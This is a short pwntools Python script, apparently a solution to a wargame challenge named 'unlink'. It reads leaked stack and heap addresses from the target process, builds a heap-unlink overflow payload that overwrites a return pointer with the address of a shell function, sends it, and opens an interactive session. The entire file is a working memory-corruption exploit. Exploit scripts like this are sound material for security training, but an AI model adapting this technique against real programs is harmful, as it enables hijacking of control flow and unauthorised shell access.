from pwn import *

p = process("/home/unlink/unlink")

s = p.recvuntil("!")

a,b,c = s.split(":")


stack_addr = int(b.split("\n")[0].strip(),16)
heap_addr = int(c.split("\n")[0].strip(), 16)


return_addr = stack_addr + 0x10
shell_addr = 0x80484eb

payload = ''

payload += 'A'*16
payload += p32(heap_addr + 0x24)
payload += p32(return_addr)
payload += p32(shell_addr)



p.sendline(payload)

p.interactive()
